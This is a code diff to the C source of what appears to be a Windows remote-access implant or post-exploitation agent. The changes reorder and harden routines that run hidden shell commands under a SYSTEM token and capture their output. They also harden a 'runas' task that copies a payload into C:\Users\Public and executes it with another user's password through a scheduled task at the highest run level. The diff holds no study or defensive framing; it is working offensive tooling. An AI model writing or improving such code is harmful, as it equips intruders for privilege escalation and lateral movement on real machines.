@@ -113,93 +113,9 @@ static char* run_shell(const char *cmd) {
         enable_privilege(hSysTok, "SeIncreaseQuotaPrivilege");
         enable_privilege(hSysTok, "SeAssignPrimaryTokenPrivilege");
 
-        /* ── T1: CreateProcessAsUserW + anonymous pipes ─────────────────────
-           Does NOT go through seclogon — direct creation in the caller's session,
-           so pipe handles inherit correctly without STATUS_DLL_INIT_FAILED. */
-        char *pipe_result = NULL;
-        {
-            SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
-            HANDLE hRead = NULL, hWrite = NULL;
-            BOOL pipe_ok = CreatePipe(&hRead, &hWrite, &sa, 0);
-            if (pipe_ok) pipe_ok = SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
-            if (!pipe_ok) {
-                if (hRead)  CloseHandle(hRead);
-                if (hWrite) CloseHandle(hWrite);
-                hRead = hWrite = NULL;
-            }
-            if (pipe_ok) {
-                char pipe_args[4096];
-                snprintf(pipe_args, sizeof(pipe_args), "/d /c %s 2>&1", cmd);
-                wchar_t wargs_pipe[4096];
-                MultiByteToWideChar(CP_ACP, 0, pipe_args, -1, wargs_pipe,
-                                    (int)(sizeof(wargs_pipe)/sizeof(wargs_pipe[0])));
-                STARTUPINFOW si = {0};
-                si.cb = sizeof(si);
-                si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-                si.wShowWindow = SW_HIDE;
-                si.hStdInput = NULL; si.hStdOutput = hWrite; si.hStdError = hWrite;
-                PROCESS_INFORMATION pi = {0};
-                BOOL proc_ok = CreateProcessAsUserW(hSysTok, cmd_app, wargs_pipe,
-                    NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
-                CloseHandle(hWrite);
-                if (proc_ok) {
-                    size_t cap = 4096, len = 0;
-                    char *buf = (char*)malloc(cap + 1);
-                    if (buf) {
-                        DWORD tick_start = GetTickCount();
-                        while (1) {
-                            DWORD avail = 0;
-                            if (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
-                                if (len + avail >= cap) {
-                                    size_t nc = (cap + avail) * 2;
-                                    char *nb = (char*)realloc(buf, nc + 1);
-                                    if (nb) { buf = nb; cap = nc; }
-                                }
-                                DWORD nr = 0;
-                                DWORD to_read = (DWORD)(cap - len) < avail ?
-                                                (DWORD)(cap - len) : avail;
-                                ReadFile(hRead, buf + len, to_read, &nr, NULL);
-                                len += nr;
-                                continue;
-                            }
-                            DWORD exit_code = STILL_ACTIVE;
-                            GetExitCodeProcess(pi.hProcess, &exit_code);
-                            if (exit_code != STILL_ACTIVE) {
-                                avail = 0;
-                                while (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
-                                    if (len + avail >= cap) {
-                                        size_t nc = (cap + avail) * 2;
-                                        char *nb = (char*)realloc(buf, nc + 1);
-                                        if (nb) { buf = nb; cap = nc; }
-                                    }
-                                    DWORD nr = 0;
-                                    DWORD to_read = (DWORD)(cap - len) < avail ?
-                                                    (DWORD)(cap - len) : avail;
-                                    ReadFile(hRead, buf + len, to_read, &nr, NULL);
-                                    len += nr;
-                                    avail = 0;
-                                }
-                                break;
-                            }
-                            if (GetTickCount() - tick_start > 60000) {
-                                TerminateProcess(pi.hProcess, 1); break;
-                            }
-                            Sleep(10);
-                        }
-                        buf[len] = '\0';
-                        pipe_result = buf;
-                    }
-                    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-                }
-                CloseHandle(hRead);
-            }
-        }
-        if (pipe_result) return pipe_result;
-
-        /* ── T2 fallback: CreateProcessWithTokenW + temp file ───────────────
-           Only reached if CreateProcessAsUserW failed (SeAssignPrimaryToken
-           not available). Child writes its own output file — no pipe
-           handle inheritance across session boundaries needed. */
+        /* Use the same token-launch path as the Go agent.  The child owns the
+           redirection file, so seclogon never has to duplicate anonymous pipe
+           handles across sessions. */
         char out_path[MAX_PATH];
         snprintf(out_path, sizeof(out_path),
                  "C:\\Windows\\Temp\\sbo%08lx%08lx.tmp",
@@ -215,50 +131,61 @@ static char* run_shell(const char *cmd) {
         MultiByteToWideChar(CP_ACP, 0, redir_args, -1, wargs,
                             (int)(sizeof(wargs)/sizeof(wargs[0])));
         memcpy(wargs2, wargs, sizeof(wargs2));
-        STARTUPINFOW si2 = {0};
-        si2.cb = sizeof(si2);
-        si2.dwFlags = STARTF_USESHOWWINDOW;
-        si2.wShowWindow = SW_HIDE;
-        PROCESS_INFORMATION pi2 = {0};
-        BOOL proc_ok2 = FALSE;
+        STARTUPINFOW si = {0};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi = {0};
+        BOOL proc_ok = FALSE;
         DWORD with_token_err = 0, as_user_err = 0, imp_err = 0;
         if (CreateProcessWithTokenW) {
-            proc_ok2 = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs,
-                CREATE_NO_WINDOW, NULL, cmd_cwd, &si2, &pi2);
-            if (!proc_ok2) with_token_err = GetLastError();
+            proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs,
+                CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
+            if (!proc_ok) with_token_err = GetLastError();
         }
-        if (!proc_ok2 && CreateProcessAsUserW) {
-            proc_ok2 = CreateProcessAsUserW(hSysTok, cmd_app, wargs2,
-                NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, cmd_cwd, &si2, &pi2);
-            if (!proc_ok2) as_user_err = GetLastError();
+        if (!proc_ok && CreateProcessAsUserW) {
+            proc_ok = CreateProcessAsUserW(hSysTok, cmd_app, wargs2,
+                NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
+            if (!proc_ok) as_user_err = GetLastError();
         }
-        if (!proc_ok2 && CreateProcessWithTokenW) {
+        if (!proc_ok && CreateProcessWithTokenW) {
             if (ImpersonateLoggedOnUser(hSysTok)) {
                 wchar_t wargs3[4096 + MAX_PATH + 32];
                 memcpy(wargs3, wargs, sizeof(wargs3));
-                proc_ok2 = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs3,
-                    CREATE_NO_WINDOW, NULL, cmd_cwd, &si2, &pi2);
-                if (!proc_ok2) with_token_err = GetLastError();
+                proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wargs3,
+                    CREATE_NO_WINDOW, NULL, cmd_cwd, &si, &pi);
+                if (!proc_ok) with_token_err = GetLastError();
                 RevertToSelf();
             } else {
                 imp_err = GetLastError();
             }
         }
-        if (!proc_ok2) {
+        if (!proc_ok) {
             char *e = (char*)malloc(192);
             snprintf(e, 192,
                      "[error: SYSTEM shell launch; WithToken=%lu; AsUser=%lu; Impersonate=%lu]",
                      with_token_err, as_user_err, imp_err);
             return e;
         }
-        WaitForSingleObject(pi2.hProcess, 60000);
-        CloseHandle(pi2.hProcess); CloseHandle(pi2.hThread);
+        DWORD wait_result = WaitForSingleObject(pi.hProcess, 60000);
+        DWORD child_exit = STILL_ACTIVE;
+        GetExitCodeProcess(pi.hProcess, &child_exit);
+        if (wait_result == WAIT_TIMEOUT) {
+            TerminateProcess(pi.hProcess, 1);
+            child_exit = 1;
+        }
+        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
         HANDLE hFile = CreateFileA(out_path, GENERIC_READ,
             FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile == INVALID_HANDLE_VALUE) {
             DeleteFileA(out_path);
-            return strdup("");
+            char *e = (char*)malloc(192);
+            snprintf(e, 192,
+                     "[error: SYSTEM shell capture missing; exit=%lu; WithToken=%lu; AsUser=%lu]",
+                     (unsigned long)child_exit, (unsigned long)with_token_err,
+                     (unsigned long)as_user_err);
+            return e;
         }
         DWORD fsize = GetFileSize(hFile, NULL);
         char *buf2 = fsize > 0 ? (char*)malloc((size_t)fsize + 1) : NULL;
@@ -269,7 +196,20 @@ static char* run_shell(const char *cmd) {
         }
         CloseHandle(hFile);
         DeleteFileA(out_path);
-        return buf2 ? buf2 : strdup("");
+        if (!buf2) {
+            /* Empty output is valid for commands such as schtasks /Run, but
+               a non-zero child exit with no file data is a real failure. */
+            if (child_exit != 0) {
+                char *e = (char*)malloc(192);
+                snprintf(e, 192,
+                         "[error: SYSTEM shell capture empty; exit=%lu; WithToken=%lu; AsUser=%lu]",
+                         (unsigned long)child_exit, (unsigned long)with_token_err,
+                         (unsigned long)as_user_err);
+                return e;
+            }
+            return strdup("");
+        }
+        return buf2;
     }
 
     FILE *f = _popen(full_cmd, "r");
@@ -290,6 +230,16 @@ static char* run_shell(const char *cmd) {
     buf[len] = '\0';
     _pclose(f);
     return buf;
+}
+
+/* schtasks writes failures to its captured stream while still returning a
+   normal-looking string to the caller.  Keep the RunAs path from reporting a
+   false [+] when task creation or execution was rejected. */
+static int shell_output_is_error(const char *out) {
+    if (!out) return 1;
+    if (strstr(out, "[error:") || strstr(out, "ERROR:") || strstr(out, "ERROR "))
+        return 1;
+    return 0;
 }
 
 // ── Directory listing ─────────────────────────────────────────────────────────
@@ -3199,16 +3149,19 @@ void dispatch_task(AgentTask *task) {
             enable_privilege(hSysTok,"SeImpersonatePrivilege");
             enable_privilege(hSysTok,"SeIncreaseQuotaPrivilege");
             enable_privilege(hSysTok,"SeAssignPrimaryTokenPrivilege");
-            proc_ok = CreateProcessWithTokenW(hSysTok,0,shell_app_w,shell_args_w,
-                CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",&isi,&ipi);
-            if (!proc_ok) with_token_err = GetLastError();
+            /* CreateProcessAsUserW is the pipe-safe path: unlike
+               CreateProcessWithTokenW/seclogon it can inherit the handles
+               already placed in STARTUPINFO. */
+            WCHAR shell_args_user[256];
+            memcpy(shell_args_user,shell_args_w,sizeof(shell_args_user));
+            proc_ok = CreateProcessAsUserW(hSysTok,shell_app_w,shell_args_user,
+                NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",
+                &isi,&ipi);
+            if (!proc_ok) as_user_err = GetLastError();
             if (!proc_ok) {
-                WCHAR shell_args_user[256];
-                memcpy(shell_args_user,shell_args_w,sizeof(shell_args_user));
-                proc_ok = CreateProcessAsUserW(hSysTok,shell_app_w,shell_args_user,
-                    NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",
-                    &isi,&ipi);
-                if (!proc_ok) as_user_err = GetLastError();
+                proc_ok = CreateProcessWithTokenW(hSysTok,0,shell_app_w,shell_args_w,
+                    CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32",&isi,&ipi);
+                if (!proc_ok) with_token_err = GetLastError();
             }
             if (!proc_ok) {
                 if (ImpersonateLoggedOnUser(hSysTok)) {
@@ -3677,23 +3630,43 @@ void dispatch_task(AgentTask *task) {
             /* Stage to world-readable path */
             char pub_path[512]={0};
             const char *base=strrchr(lat_cmd,'\\');
+            if (!base) base = strrchr(lat_cmd,'/');
             base = base ? base+1 : lat_cmd;
+            if (!base[0]) {
+                agent_send_result(task->id, "", "runas: payload path is empty"); return;
+            }
             snprintf(pub_path, sizeof(pub_path), "C:\\Users\\Public\\%s", base);
-            if (_stricmp(lat_cmd, pub_path) != 0)
-                CopyFileA(lat_cmd, pub_path, FALSE);
-            if (GetFileAttributesA(pub_path) == INVALID_FILE_ATTRIBUTES)
-                strncpy(pub_path, lat_cmd, sizeof(pub_path)-1);
+            if (_stricmp(lat_cmd, pub_path) != 0 && !CopyFileA(lat_cmd, pub_path, TRUE)) {
+                agent_send_result(task->id, "", "runas: could not stage payload in C:\\Users\\Public");
+                return;
+            }
+            if (GetFileAttributesA(pub_path) == INVALID_FILE_ATTRIBUTES) {
+                agent_send_result(task->id, "", "runas: could not stage payload in C:\\Users\\Public");
+                return;
+            }
             char ru_res[4096]={0};
             snprintf(lat_buf,sizeof(lat_buf),
-                "schtasks /Create /SC ONCE /ST 00:00 /F /TN %s "
-                "/TR \"\\\"%s\\\"\" /RU \"%s\" /RP \"%s\" 2>&1",
+                "schtasks /Create /SC ONCE /ST 00:00 /RL HIGHEST /F /TN %s "
+                "/TR \"%s\" /RU \"%s\" /RP \"%s\" 2>&1",
                 ru_tn,pub_path,ru,lat_pass);
             char *rr1=run_shell(lat_buf);
+            if (shell_output_is_error(rr1)) {
+                agent_send_result(task->id, "", rr1 ? rr1 : "runas: schtasks /Create failed");
+                free(rr1);
+                return;
+            }
             snprintf(ru_res,sizeof(ru_res),"[+] runas → %s @ %s\n    cmd: %s\n%s\n",
                 ru,lat_host,pub_path,rr1?rr1:"");
             free(rr1);
             snprintf(lat_buf,sizeof(lat_buf),"schtasks /Run /TN %s 2>&1",ru_tn);
             char *rr2=run_shell(lat_buf);
+            if (shell_output_is_error(rr2)) {
+                agent_send_result(task->id, "", rr2 ? rr2 : "runas: schtasks /Run failed");
+                free(rr2);
+                snprintf(lat_buf,sizeof(lat_buf),"schtasks /Delete /TN %s /F 2>&1",ru_tn);
+                char *cleanup=run_shell(lat_buf); free(cleanup);
+                return;
+            }
             strncat(ru_res,rr2?rr2:"",sizeof(ru_res)-strlen(ru_res)-1);
             free(rr2);
             Sleep(3000);
